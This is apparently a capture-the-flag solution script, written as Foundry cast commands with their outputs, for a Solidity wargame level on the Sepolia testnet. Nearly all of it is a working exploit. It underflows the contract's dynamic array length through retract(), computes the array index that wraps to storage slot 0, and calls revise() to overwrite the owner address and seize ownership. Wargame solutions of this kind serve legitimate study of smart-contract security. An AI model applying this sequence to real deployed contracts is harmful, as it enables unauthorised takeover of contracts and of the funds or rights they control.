# Make contract "contacted":
cast send $CONTRACT "makeContact()" --private-key $PRIV_KEY --rpc-url sepolia

# Get the contract's storage:
cast storage $CONTRACT 0 --rpc-url sepolia # 0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
cast storage $CONTRACT 1 --rpc-url sepolia # 0x0000000000000000000000000000000000000000000000000000000000000000

# Take advantage of old solidity over/underflow:
cast send $CONTRACT "retract()" --private-key $PRIV_KEY --rpc-url sepolia
cast storage $CONTRACT 1 --rpc-url sepolia
# 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

# Get codex array data location:
cast keccak 0x0000000000000000000000000000000000000000000000000000000000000001
# 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

# Get storage location of Ownable._owner state variable (slot 0):
# python3
# >>> ((2**256)-1) - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1
# 35707666377435648211887908874984608119992236509074197713628505308453184860938

# Convert uint256 to bytes32 hex:
cast --to-uint256 35707666377435648211887908874984608119992236509074197713628505308453184860938 # 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

# Update owner:
# address:                    0x00000000000000000000000090cfbffb21423219a6bcdbe08f8dc108ca7eea75
# address with contacted set: 0x00000000000000000000000190cfbffb21423219a6bcdbe08f8dc108ca7eea75 (optional)
cast send $CONTRACT "revise(uint256,bytes32)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a 0x00000000000000000000000190cfbffb21423219a6bcdbe08f8dc108ca7eea75 --private-key $PRIV_KEY --rpc-url sepolia

# Verify owner:
cast call $CONTRACT "owner()" --rpc-url sepolia
